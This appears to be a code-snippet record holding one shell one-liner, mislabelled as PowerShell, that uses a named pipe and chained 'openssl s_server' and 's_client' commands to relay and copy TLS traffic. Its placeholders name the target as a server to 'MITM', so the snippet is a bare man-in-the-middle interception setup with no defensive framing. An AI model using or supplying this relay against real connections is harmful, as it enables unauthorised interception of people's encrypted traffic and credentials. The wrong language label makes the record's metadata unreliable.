---
id: f9b690b9-f75c-4120-ace0-07cd7fbec15e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:22.336025+00:00'
updated_at: '2023-04-10T20:25:09.845260+00:00'
---

# Code Snippet f9b690b9

**Language**: Powershell

```powershell
mkfifo response
sudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat > response
```


